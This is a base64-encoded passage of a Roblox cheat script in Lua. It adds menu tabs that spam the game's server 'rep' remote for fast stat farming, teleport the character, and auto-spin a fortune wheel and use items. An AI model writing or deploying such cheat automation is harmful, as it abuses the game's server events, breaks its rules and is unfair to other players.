2ggPSBGYXN0UmViVGFiOkFkZFN3aXRjaCgiU3BpbiBGb3J0dW5lIFdoZWVsIiwgZnVuY3Rpb24oYm9vbCkKICAgIF9HLkF1dG9TcGluV2hlZWwgPSBib29sCiAgICAKICAgIGlmIGJvb2wgdGhlbgogICAgICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgX0cuQXV0b1NwaW5XaGVlbCBhbmQgd2FpdCgxKSBkbwogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMub3BlbkZvcnR1bmVXaGVlbFJlbW90ZTpJbnZva2VTZXJ2ZXIoIm9wZW5Gb3J0dW5lV2hlZWwiLCBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuZm9ydHVuZVdoZWVsQ2hhbmNlc1siRm9ydHVuZSBXaGVlbCJdKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKRmFzdFJlYlRhYjpBZGRCdXR0b24oIkp1bmdsZSBMaWZ0IixmdW5jdGlvbigpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGNoYXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIFBsYXllci5DaGFyYWN0ZXJBZGRlZDp3YWl0KCkKICAgIGxvY2FsIGhycCA9IGNoYXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGhycC5DRnJhbWUgPSBDRnJhbWUubmV3KC04NjQyLjM5NjQ4NDM3NSwgNi43OTgwNjUxODU1LCAyMDg2LjEwMzAyNzMpCiAgICB0YXNrLndhaXQoMC4yKQogICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kS2V5RXZlbnQodHJ1ZSwgRW51bS5LZXlDb2RlLkUsIGZhbHNlLCBnYW1lKQogICAgdGFzay53YWl0KDAuMDUpCiAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRLZXlFdmVudChmYWxzZSwgRW51bS5LZXlDb2RlLkUsIGZhbHNlLCBnYW1lKQplbmQpCgoKCgoKCmxvY2FsIEZhcm1pbmdUYWIgPSB3aW5kb3c6QWRkVGFiKCJGYXN0IEZhcm0iKQoKbG9jYWwgc3RyZW5ndGhTdGF0ID0gbGVhZGVyc3RhdHM6V2FpdEZvckNoaWxkKCJTdHJlbmd0aCIpCmxvY2FsIGR1cmFiaWxpdHlTdGF0ID0gcGxheWVyOldhaXRGb3JDaGlsZCgiRHVyYWJpbGl0eSIpCgpsb2NhbCBmdW5jdGlvbiBmb3JtYXROdW1iZXIobnVtYmVyKQogICAgbG9jYWwgaXNOZWdhdGl2ZSA9IG51bWJlciA8IDAKICAgIG51bWJlciA9IG1hdGguYWJzKG51bWJlcikKICAgIGlmIG51bWJlciA+PSAxZTE1IHRoZW4KICAgICAgICByZXR1cm4gKGlzTmVnYXRpdmUgYW5kICItIiBvciAiIikgLi4gc3RyaW5nLmZvcm1hdCgiJS4yZlFhIiwgbnVtYmVyIC8gMWUxNSkKICAgIGVsc2VpZiBudW1iZXIgPj0gMWUxMiB0aGVuCiAgICAgICAgcmV0dXJuIChpc05lZ2F0aXZlIGFuZCAiLSIgb3IgIiIpIC4uIHN0cmluZy5mb3JtYXQoIiUuMmZUIiwgbnVtYmVyIC8gMWUxMikKICAgIGVsc2VpZiBudW1iZXIgPj0gMWU5IHRoZW4KICAgICAgICByZXR1cm4gKGlzTmVnYXRpdmUgYW5kICItIiBvciAiIikgLi4gc3RyaW5nLmZvcm1hdCgiJS4yZkIiLCBudW1iZXIgLyAxZTkpCiAgICBlbHNlaWYgbnVtYmVyID49IDFlNiB0aGVuCiAgICAgICAgcmV0dXJuIChpc05lZ2F0aXZlIGFuZCAiLSIgb3IgIiIpIC4uIHN0cmluZy5mb3JtYXQoIiUuMmZNIiwgbnVtYmVyIC8gMWU2KQogICAgZWxzZWlmIG51bWJlciA+PSAxZTMgdGhlbgogICAgICAgIHJldHVybiAoaXNOZWdhdGl2ZSBhbmQgIi0iIG9yICIiKSAuLiBzdHJpbmcuZm9ybWF0KCIlLjJmSyIsIG51bWJlciAvIDFlMykKICAgIGVsc2UKICAgICAgICByZXR1cm4gKGlzTmVnYXRpdmUgYW5kICItIiBvciAiIikgLi4gc3RyaW5nLmZvcm1hdCgiJS4yZiIsIG51bWJlcikKICAgIGVuZAplbmQKCkZhcm1pbmdUYWI6QWRkTGFiZWwoIlRpbWU6IikuVGV4dFNpemUgPSAyMApsb2NhbCBzdG9wd2F0Y2hMYWJlbCA9IEZhcm1pbmdUYWI6QWRkTGFiZWwoIjBkIDBoIDBtIDBzIC0gRmFzdCBSZXAgSW5hY3RpdmUiKQpzdG9wd2F0Y2hMYWJlbC5UZXh0U2l6ZSA9IDE3CnN0b3B3YXRjaExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCkKCmxvY2FsIHByb2plY3RlZFN0cmVuZ3RoTGFiZWwgPSBGYXJtaW5nVGFiOkFkZExhYmVsKCJTdHJlbmd0aCBQYWNlOiAwIC9Ib3VyIHwgMCAvRGF5IHwgMCAvV2VlayIpCnByb2plY3RlZFN0cmVuZ3RoTGFiZWwuVGV4dFNpemUgPSAxNwpsb2NhbCBwcm9qZWN0ZWREdXJhYmlsaXR5TGFiZWwgPSBGYXJtaW5nVGFiOkFkZExhYmVsKCJEdXJhYmlsaXR5IFBhY2U6IDAgL0hvdXIgfCAwIC9EYXkgfCAwIC9XZWVrIikKcHJvamVjdGVkRHVyYWJpbGl0eUxhYmVsLlRleHRTaXplID0gMTcKbG9jYWwgYXZlcmFnZVN0cmVuZ3RoTGFiZWwgPSBGYXJtaW5nVGFiOkFkZExhYmVsKCJBdmVyYWdlIFN0cmVuZ3RoIFBhY2U6IDAgL0hvdXIgfCAwIC9EYXkgfCAwIC9XZWVrIikKYXZlcmFnZVN0cmVuZ3RoTGFiZWwuVGV4dFNpemUgPSAxNwpsb2NhbCBhdmVyYWdlRHVyYWJpbGl0eUxhYmVsID0gRmFybWluZ1RhYjpBZGRMYWJlbCgiQXZlcmFnZSBEdXJhYmlsaXR5IFBhY2U6IDAgL0hvdXIgfCAwIC9EYXkgfCAwIC9XZWVrIikKYXZlcmFnZUR1cmFiaWxpdHlMYWJlbC5UZXh0U2l6ZSA9IDE3CgpGYXJtaW5nVGFiOkFkZExhYmVsKCIiKS5UZXh0U2l6ZSA9IDEwCmxvY2FsIHN0YXRzTGFiZWwgPSBGYXJtaW5nVGFiOkFkZExhYmVsKCJTdGF0czoiKQpzdGF0c0xhYmVsLlRleHRTaXplID0gMjAKbG9jYWwgc3RyZW5ndGhMYWJlbCA9IEZhcm1pbmdUYWI6QWRkTGFiZWwoIlN0cmVuZ3RoOiAwIHwgR2FpbmVkOiAwIikKc3RyZW5ndGhMYWJlbC5UZXh0U2l6ZSA9IDE3CmxvY2FsIGR1cmFiaWxpdHlMYWJlbCA9IEZhcm1pbmdUYWI6QWRkTGFiZWwoIkR1cmFiaWxpdHk6IDAgfCBHYWluZWQ6IDAiKQpkdXJhYmlsaXR5TGFiZWwuVGV4dFNpemUgPSAxNwoKbG9jYWwgc3RhcnRUaW1lID0gMApsb2NhbCBwYXVzZWRFbGFwc2VkVGltZSA9IDAKbG9jYWwgbGFzdFBhdXNlVGltZSA9IDAKCmxvY2FsIHJ1bkZhc3RSZXAgPSBmYWxzZQpsb2NhbCB0cmFja2luZ1N0YXJ0ZWQgPSBmYWxzZQoKbG9jYWwgc3RyZW5ndGhIaXN0b3J5ID0ge30KbG9jYWwgZHVyYWJpbGl0eUhpc3RvcnkgPSB7fQpsb2NhbCBjYWxjdWxhdGlvbkludGVydmFsID0gMTAKCmxvY2FsIGluaXRpYWxTdHJlbmd0aCA9IHN0cmVuZ3RoU3RhdC5WYWx1ZQpsb2NhbCBpbml0aWFsRHVyYWJpbGl0eSA9IGR1cmFiaWxpdHlTdGF0LlZhbHVlCgp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIGxvY2FsIGxhc3RDYWxjVGltZSA9IHRpY2soKQogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIGxvY2FsIGN1cnJlbnRUaW1lID0gdGljaygpCiAgICAgICAgbG9jYWwgY3VycmVudFN0cmVuZ3RoID0gc3RyZW5ndGhTdGF0LlZhbHVlCiAgICAgICAgbG9jYWwgY3VycmVudER1cmFiaWxpdHkgPSBkdXJhYmlsaXR5U3RhdC5WYWx1ZQoKICAgICAgICBzdHJlbmd0aExhYmVsLlRleHQgPSAiU3RyZW5ndGg6ICIgLi4gZm9ybWF0TnVtYmVyKGN1cnJlbnRTdHJlbmd0aCkgLi4gIiB8IEdhaW5lZDogIiAuLiBmb3JtYXROdW1iZXIoY3VycmVudFN0cmVuZ3RoIC0gaW5pdGlhbFN0cmVuZ3RoKQogICAgICAgIGR1cmFiaWxpdHlMYWJlbC5UZXh0ID0gIkR1cmFiaWxpdHk6ICIgLi4gZm9ybWF0TnVtYmVyKGN1cnJlbnREdXJhYmlsaXR5KSAuLiAiIHwgR2FpbmVkOiAiIC4uIGZvcm1hdE51bWJlcihjdXJyZW50RHVyYWJpbGl0eSAtIGluaXRpYWxEdXJhYmlsaXR5KQoKICAgICAgICBpZiBydW5GYXN0UmVwIHRoZW4KICAgICAgICAgICAgaWYgbm90IHRyYWNraW5nU3RhcnRlZCB0aGVuCiAgICAgICAgICAgICAgICB0cmFja2luZ1N0YXJ0ZWQgPSB0cnVlCiAgICAgICAgICAgICAgICBzdGFydFRpbWUgPSBjdXJyZW50VGltZQogICAgICAgICAgICAgICAgc3RyZW5ndGhIaXN0b3J5ID0ge30KICAgICAgICAgICAgICAgIGR1cmFiaWxpdHlIaXN0b3J5ID0ge30KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGxvY2FsIGVsYXBzZWRUaW1lID0gcGF1c2VkRWxhcHNlZFRpbWUgKyAoY3VycmVudFRpbWUgLSBzdGFydFRpbWUpCiAgICAgICAgICAgIGxvY2FsIGRheXMgPSBtYXRoLmZsb29yKGVsYXBzZWRUaW1lIC8gKDI0ICogMzYwMCkpCiAgICAgICAgICAgIGxvY2FsIGhvdXJzID0gbWF0aC5mbG9vcigoZWxhcHNlZFRpbWUgJSAoMjQgKiAzNjAwKSkgLyAzNjAwKQogICAgICAgICAgICBsb2NhbCBtaW51dGVzID0gbWF0aC5mbG9vcigoZWxhcHNlZFRpbWUgJSAzNjAwKSAvIDYwKQogICAgICAgICAgICBsb2NhbCBzZWNvbmRzID0gbWF0aC5mbG9vcihlbGFwc2VkVGltZSAlIDYwKQogICAgICAgICAgICBzdG9wd2F0Y2hMYWJlbC5UZXh0ID0gc3RyaW5nLmZvcm1hdCgiJWRkICVkaCAlZG0gJWRzIC0gRmFzdCBSZXAgUnVubmluZyIsIGRheXMsIGhvdXJzLCBtaW51dGVzLCBzZWNvbmRzKQogICAgICAgICAgICBzdG9wd2F0Y2hMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoNTAsIDI1NSwgNTApCgogICAgICAgICAgICB0YWJsZS5pbnNlcnQoc3RyZW5ndGhIaXN0b3J5LCB7dGltZSA9IGN1cnJlbnRUaW1lLCB2YWx1ZSA9IGN1cnJlbnRTdHJlbmd0aH0pCiAgICAgICAgICAgIHRhYmxlLmluc2VydChkdXJhYmlsaXR5SGlzdG9yeSwge3RpbWUgPSBjdXJyZW50VGltZSwgdmFsdWUgPSBjdXJyZW50RHVyYWJpbGl0eX0pCgogICAgICAgICAgICB3aGlsZSAjc3RyZW5ndGhIaXN0b3J5ID4gMCBhbmQgY3VycmVudFRpbWUgLSBzdHJlbmd0aEhpc3RvcnlbMV0udGltZSA+IGNhbGN1bGF0aW9uSW50ZXJ2YWwgZG8KICAgICAgICAgICAgICAgIHRhYmxlLnJlbW92ZShzdHJlbmd0aEhpc3RvcnksIDEpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB3aGlsZSAjZHVyYWJpbGl0eUhpc3RvcnkgPiAwIGFuZCBjdXJyZW50VGltZSAtIGR1cmFiaWxpdHlIaXN0b3J5WzFdLnRpbWUgPiBjYWxjdWxhdGlvbkludGVydmFsIGRvCiAgICAgICAgICAgICAgICB0YWJsZS5yZW1vdmUoZHVyYWJpbGl0eUhpc3RvcnksIDEpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgY3VycmVudFRpbWUgLSBsYXN0Q2FsY1RpbWUgPj0gY2FsY3VsYXRpb25JbnRlcnZhbCB0aGVuCiAgICAgICAgICAgICAgICBsYXN0Q2FsY1RpbWUgPSBjdXJyZW50VGltZQoKICAgICAgICAgICAgICAgIGlmICNzdHJlbmd0aEhpc3RvcnkgPj0gMiB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc3RyZW5ndGhEZWx0YSA9IHN0cmVuZ3RoSGlzdG9yeVsjc3RyZW5ndGhIaXN0b3J5XS52YWx1ZSAtIHN0cmVuZ3RoSGlzdG9yeVsxXS52YWx1ZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHN0cmVuZ3RoUGVyU2Vjb25kID0gc3RyZW5ndGhEZWx0YSAvIGNhbGN1bGF0aW9uSW50ZXJ2YWwKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdHJlbmd0aFBlckhvdXIgPSBzdHJlbmd0aFBlclNlY29uZCAqIDM2MDAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdHJlbmd0aFBlckRheSA9IHN0cmVuZ3RoUGVyU2Vjb25kICogODY0MDAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdHJlbmd0aFBlcldlZWsgPSBzdHJlbmd0aFBlclNlY29uZCAqIDYwNDgwMAogICAgICAgICAgICAgICAgICAgIHByb2plY3RlZFN0cmVuZ3RoTGFiZWwuVGV4dCA9ICJTdHJlbmd0aCBQYWNlOiAiIC4uIGZvcm1hdE51bWJlcihzdHJlbmd0aFBlckhvdXIpIC4uICIvSG91ciB8ICIgLi4gZm9ybWF0TnVtYmVyKHN0cmVuZ3RoUGVyRGF5KSAuLiAiL0RheSB8ICIgLi4gZm9ybWF0TnVtYmVyKHN0cmVuZ3RoUGVyV2VlaykgLi4gIi9XZWVrIgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgI2R1cmFiaWxpdHlIaXN0b3J5ID49IDIgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGR1cmFiaWxpdHlEZWx0YSA9IGR1cmFiaWxpdHlIaXN0b3J5WyNkdXJhYmlsaXR5SGlzdG9yeV0udmFsdWUgLSBkdXJhYmlsaXR5SGlzdG9yeVsxXS52YWx1ZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGR1cmFiaWxpdHlQZXJTZWNvbmQgPSBkdXJhYmlsaXR5RGVsdGEgLyBjYWxjdWxhdGlvbkludGVydmFsCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZHVyYWJpbGl0eVBlckhvdXIgPSBkdXJhYmlsaXR5UGVyU2Vjb25kICogMzYwMAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGR1cmFiaWxpdHlQZXJEYXkgPSBkdXJhYmlsaXR5UGVyU2Vjb25kICogODY0MDAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBkdXJhYmlsaXR5UGVyV2VlayA9IGR1cmFiaWxpdHlQZXJTZWNvbmQgKiA2MDQ4MDAKICAgICAgICAgICAgICAgICAgICBwcm9qZWN0ZWREdXJhYmlsaXR5TGFiZWwuVGV4dCA9ICJEdXJhYmlsaXR5IFBhY2U6ICIgLi4gZm9ybWF0TnVtYmVyKGR1cmFiaWxpdHlQZXJIb3VyKSAuLiAiL0hvdXIgfCAiIC4uIGZvcm1hdE51bWJlcihkdXJhYmlsaXR5UGVyRGF5KSAuLiAiL0RheSB8ICIgLi4gZm9ybWF0TnVtYmVyKGR1cmFiaWxpdHlQZXJXZWVrKSAuLiAiL1dlZWsiCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCB0b3RhbEVsYXBzZWQgPSBwYXVzZWRFbGFwc2VkVGltZSArIChjdXJyZW50VGltZSAtIHN0YXJ0VGltZSkKICAgICAgICAgICAgICAgIGlmIHRvdGFsRWxhcHNlZCA+IDAgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGF2Z1N0cmVuZ3RoUGVyU2Vjb25kID0gKGN1cnJlbnRTdHJlbmd0aCAtIGluaXRpYWxTdHJlbmd0aCkgLyB0b3RhbEVsYXBzZWQKICAgICAgICAgICAgICAgICAgICBsb2NhbCBhdmdTdHJlbmd0aFBlckhvdXIgPSBhdmdTdHJlbmd0aFBlclNlY29uZCAqIDM2MDAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBhdmdTdHJlbmd0aFBlckRheSA9IGF2Z1N0cmVuZ3RoUGVyU2Vjb25kICogODY0MDAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBhdmdTdHJlbmd0aFBlcldlZWsgPSBhdmdTdHJlbmd0aFBlclNlY29uZCAqIDYwNDgwMAogICAgICAgICAgICAgICAgICAgIGF2ZXJhZ2VTdHJlbmd0aExhYmVsLlRleHQgPSAiQXZlcmFnZSBTdHJlbmd0aCBQYWNlOiAiIC4uIGZvcm1hdE51bWJlcihhdmdTdHJlbmd0aFBlckhvdXIpIC4uICIvSG91ciB8ICIgLi4gZm9ybWF0TnVtYmVyKGF2Z1N0cmVuZ3RoUGVyRGF5KSAuLiAiL0RheSB8ICIgLi4gZm9ybWF0TnVtYmVyKGF2Z1N0cmVuZ3RoUGVyV2VlaykgLi4gIi9XZWVrIgoKICAgICAgICAgICAgICAgICAgICBsb2NhbCBhdmdEdXJhYmlsaXR5UGVyU2Vjb25kID0gKGN1cnJlbnREdXJhYmlsaXR5IC0gaW5pdGlhbER1cmFiaWxpdHkpIC8gdG90YWxFbGFwc2VkCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXZnRHVyYWJpbGl0eVBlckhvdXIgPSBhdmdEdXJhYmlsaXR5UGVyU2Vjb25kICogMzYwMAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGF2Z0R1cmFiaWxpdHlQZXJEYXkgPSBhdmdEdXJhYmlsaXR5UGVyU2Vjb25kICogODY0MDAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBhdmdEdXJhYmlsaXR5UGVyV2VlayA9IGF2Z0R1cmFiaWxpdHlQZXJTZWNvbmQgKiA2MDQ4MDAKICAgICAgICAgICAgICAgICAgICBhdmVyYWdlRHVyYWJpbGl0eUxhYmVsLlRleHQgPSAiQXZlcmFnZSBEdXJhYmlsaXR5IFBhY2U6ICIgLi4gZm9ybWF0TnVtYmVyKGF2Z0R1cmFiaWxpdHlQZXJIb3VyKSAuLiAiL0hvdXIgfCAiIC4uIGZvcm1hdE51bWJlcihhdmdEdXJhYmlsaXR5UGVyRGF5KSAuLiAiL0RheSB8ICIgLi4gZm9ybWF0TnVtYmVyKGF2Z0R1cmFiaWxpdHlQZXJXZWVrKSAuLiAiL1dlZWsiCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBpZiB0cmFja2luZ1N0YXJ0ZWQgdGhlbgogICAgICAgICAgICAgICAgdHJhY2tpbmdTdGFydGVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHBhdXNlZEVsYXBzZWRUaW1lID0gcGF1c2VkRWxhcHNlZFRpbWUgKyAoY3VycmVudFRpbWUgLSBzdGFydFRpbWUpCiAgICAgICAgICAgICAgICBzdG9wd2F0Y2hMYWJlbC5UZXh0ID0gc3RyaW5nLmZvcm1hdCgiJWRkICVkaCAlZG0gJWRzIC0gRmFzdCBSZXAgU3RvcHBlZCIsIG1hdGguZmxvb3IocGF1c2VkRWxhcHNlZFRpbWUgLyAoMjQgKiAzNjAwKSksIG1hdGguZmxvb3IoKHBhdXNlZEVsYXBzZWRUaW1lICUgKDI0ICogMzYwMCkpIC8gMzYwMCksIG1hdGguZmxvb3IoKHBhdXNlZEVsYXBzZWRUaW1lICUgMzYwMCkgLyA2MCksIG1hdGguZmxvb3IocGF1c2VkRWxhcHNlZFRpbWUgJSA2MCkpCiAgICAgICAgICAgICAgICBzdG9wd2F0Y2hMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAxNjUsIDApCgogICAgICAgICAgICAgICAgcHJvamVjdGVkU3RyZW5ndGhMYWJlbC5UZXh0ID0gIlN0cmVuZ3RoIFBhY2U6IDAgL0hvdXIgfCAwIC9EYXkgfCAwIC9XZWVrIgogICAgICAgICAgICAgICAgcHJvamVjdGVkRHVyYWJpbGl0eUxhYmVsLlRleHQgPSAiRHVyYWJpbGl0eSBQYWNlOiAwIC9Ib3VyIHwgMCAvRGF5IHwgMCAvV2VlayIKICAgICAgICAgICAgICAgIGF2ZXJhZ2VTdHJlbmd0aExhYmVsLlRleHQgPSAiQXZlcmFnZSBTdHJlbmd0aCBQYWNlOiAwIC9Ib3VyIHwgMCAvRGF5IHwgMCAvV2VlayIKICAgICAgICAgICAgICAgIGF2ZXJhZ2VEdXJhYmlsaXR5TGFiZWwuVGV4dCA9ICJBdmVyYWdlIER1cmFiaWxpdHkgUGFjZTogMCAvSG91ciB8IDAgL0RheSB8IDAgL1dlZWsiCgogICAgICAgICAgICAgICAgc3RyZW5ndGhIaXN0b3J5ID0ge30KICAgICAgICAgICAgICAgIGR1cmFiaWxpdHlIaXN0b3J5ID0ge30KICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgZW5kCmVuZCkKCkZhcm1pbmdUYWI6QWRkTGFiZWwoIiIpCkZhcm1pbmdUYWI6QWRkTGFiZWwoIkZhc3QgRmFybSAoUmVjb21tZW5kZWQgU3BlZWQ6IDIwKSIpLlRleHRTaXplID0gMjAKCmxvY2FsIHJlcHNQZXJUaWNrID0gMQoKbG9jYWwgZnVuY3Rpb24gZ2V0UGluZygpCiAgICBsb2NhbCBzdGF0cyA9IGdhbWU6R2V0U2VydmljZSgiU3RhdHMiKQogICAgbG9jYWwgcGluZ1N0YXQgPSBzdGF0czpGaW5kRmlyc3RDaGlsZCgiUGVyZm9ybWFuY2VTdGF0cyIpIGFuZCBzdGF0cy5QZXJmb3JtYW5jZVN0YXRzOkZpbmRGaXJzdENoaWxkKCJQaW5nIikKICAgIHJldHVybiBwaW5nU3RhdCBhbmQgcGluZ1N0YXQ6R2V0VmFsdWUoKSBvciAwCmVuZAoKRmFybWluZ1RhYjpBZGRUZXh0Qm94KCJSZXAgU3BlZWQiLCBmdW5jdGlvbih2YWx1ZSkKICAgIGxvY2FsIG51bSA9IHRvbnVtYmVyKHZhbHVlKQogICAgaWYgbnVtIGFuZCBudW0gPiAwIHRoZW4KICAgICAgICByZXBzUGVyVGljayA9IG1hdGguZmxvb3IobnVtKQogICAgZW5kCmVuZCwgewogICAgcGxhY2Vob2xkZXIgPSAiMSIsCn0pCgpsb2NhbCBmdW5jdGlvbiBmYXN0UmVwTG9vcCgpCiAgICB3aGlsZSBydW5GYXN0UmVwIGRvCiAgICAgICAgbG9jYWwgc3RhcnRUaWNrID0gdGljaygpCiAgICAgICAgd2hpbGUgdGljaygpIC0gc3RhcnRUaWNrIDwgMC43NSBhbmQgcnVuRmFzdFJlcCBkbwogICAgICAgICAgICBmb3IgaSA9IDEsIHJlcHNQZXJUaWNrIGRvCiAgICAgICAgICAgICAgICBtdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDAuMDIpCiAgICAgICAgZW5kCiAgICAgICAgd2hpbGUgcnVuRmFzdFJlcCBhbmQgZ2V0UGluZygpID49IDM1MCBkbwogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCkZhcm1pbmdUYWI6QWRkU3dpdGNoKCJGYXN0IFJlcCIsIGZ1bmN0aW9uKHN0YXRlKQogICAgaWYgc3RhdGUgYW5kIG5vdCBydW5GYXN0UmVwIHRoZW4KICAgICAgICBydW5GYXN0UmVwID0gdHJ1ZQogICAgICAgIHRhc2suc3Bhd24oZmFzdFJlcExvb3ApCiAgICBlbHNlaWYgbm90IHN0YXRlIGFuZCBydW5GYXN0UmVwIHRoZW4KICAgICAgICBydW5GYXN0UmVwID0gZmFsc2UKICAgIGVuZAplbmQpCgoKCgpGYXN0UmViVGFiOkFkZExhYmVsKCIiKQoKRmFybWluZ1RhYjpBZGRMYWJlbCgiTWlzYzoiKS5UZXh0U2l6ZSA9IDIwCgpsb2NhbCBmdW5jdGlvbiB1bmVxdWlwUGV0cygpCiAgICBmb3IgXywgZm9sZGVyIGluIHBhaXJzKFBsYXllci5wZXRzRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgZm9sZGVyOklzQSgiRm9sZGVyIikgdGhlbgogICAgICAgICAgICBmb3IgXywgcGV0IGluIHBhaXJzKGZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuckV2ZW50cy5lcXVpcFBldEV2ZW50OkZpcmVTZXJ2ZXIoInVuZXF1aXBQZXQiLCBwZXQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICB0YXNrLndhaXQoMC4xKQplbmQKCmxvY2FsIGZ1bmN0aW9uIGVxdWlwUGV0c0J5TmFtZShuYW1lKQogICAgdW5lcXVpcFBldHMoKQogICAgdGFzay53YWl0KDAuMDEpCiAgICBmb3IgXywgcGV0IGluIHBhaXJzKFBsYXllci5wZXRzRm9sZGVyLlVuaXF1ZTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHBldC5OYW1lID09IG5hbWUgdGhlbgogICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5yRXZlbnRzLmVxdWlwUGV0RXZlbnQ6RmlyZVNlcnZlcigiZXF1aXBQZXQiLCBwZXQpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBhY3RpdmF0ZVByb3RlaW5FZ2coKQogICAgbG9jYWwgdG9vbCA9IFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlByb3RlaW4gRWdnIikgb3IgUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQcm90ZWluIEVnZyIpCiAgICBpZiB0b29sIHRoZW4KICAgICAgICBtdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwcm90ZWluRWdnIiwgdG9vbCkKICAgIGVuZAplbmQKCmxvY2FsIHJ1bm5pbmcgPSBmYWxzZQoKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgaWYgcnVubmluZyB0aGVuCiAgICAgICAgICAgIGFjdGl2YXRlUHJvdGVpbkVnZygpCiAgICAgICAgICAgIHRhc2sud2FpdCgxODAwKQogICAgICAgIGVsc2UKICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKbG9jYWwgc3dpdGNoID0gRmFybWluZ1RhYjpBZGRTd2l0Y2goIkF1dG8gRWdnIiwgZnVuY3Rpb24oc3RhdGUpCiAgICBydW5uaW5nID0gc3RhdGUKICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICBhY3RpdmF0ZVByb3RlaW5FZ2coKQogICAgZW5kCmVuZCkKc3dpdGNoOlNldChmYWxzZSkKCmxvY2FsIGZ1bmN0aW9uIGFjdGl2YXRlU2hha2UoKQogICAgbG9jYWwgdG9vbCA9IFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlRyb3BpY2FsIFNoYWtlIikgb3IgUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJUcm9waWNhbCBTaGFrZSIpCiAgICBpZiB0b29sIHRoZW4KICAgICAgICBtdXNjbGVFdmVudDpGaXJlU2VydmVyKCJ0cm9waWNhbFNoYWtlIiwgdG9vbCkKICAgIGVuZAplbmQKCmxvY2FsIHJ1bm5pbmcgPSBmYWxzZQoKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgaWYgcnVubmluZyB0aGVuCiAgICAgICAgICAgIGFjdGl2YXRlU2hha2UoKQogICAgICAgICAgICB0YXNrLndhaXQoOTAwKQogICAgICAgIGVsc2UKICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKbG9jYWwgc3dpdGNoID0gRmFybWluZ1RhYjpBZGRTd2l0Y2goIkF1dG8gU2hha2UiLCBmdW5jdGlvbihzdGF0ZSkKICAgIHJ1bm5pbmcgPSBzdGF0ZQogICAgaWYgc3RhdGUgdGhlbgogICAgICAgIGFjdGl2YXRlU2hha2UoKQogICAgZW5kCmVuZCkKc3dpdGNoOlNldChmYWxzZSkKCmxvY2FsIHNwaW53aGVlbFN3aXRjaCA9IEZhcm1pbmdUYWI6QWRkU3dpdGNoKCJTcGluIEZvcnR1bmUgV2hlZWwiLCBmdW5jdGlvbihib29sKQogICAgX0cuQXV0b1NwaW5XaGVlbCA9IGJvb2wKICAgIAogICAgaWYgYm9vbCB0aGVu